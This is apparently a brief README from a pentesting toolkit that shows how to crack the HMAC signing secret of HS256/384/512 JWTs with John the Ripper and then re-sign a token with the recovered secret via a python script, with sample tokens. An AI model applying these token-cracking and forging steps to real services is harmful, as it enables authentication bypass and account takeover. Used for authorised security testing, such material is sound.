# JWT Crack

Crack a HS256, HS384 or HS512-signed JWT. 

## Crack JWT with John

[John the Ripper](https://github.com/magnumripper/JohnTheRipper) now supports the JWT format, so converting the token is no longer necessary. John has a size limit on the data it will take. If you run into this limit, consider changing [`SALT_LIMBS` in the source code](https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/src/hmacSHA256_fmt_plug.c#L64).

```
sudo john JWT_FILE --wordlist /path/to/word.lists --format=HMAC-SHA256
```

-------------

## Generates a new JWT

Generates a new JWT that is signed with HS256 with the same payload value of a provided JWT.

```
python3 jwt-pwn/jwt-any-to-hs256.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc
8D-J1YqLEv9ypAApz27nfYP5L4" [SECRET]


[#] Generated JWT:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqd3QiOiJwd24ifQ.WqY6R5zmscIx_6ZFwSASHZ_1zbqih_IdtLv_S2Pj028
```

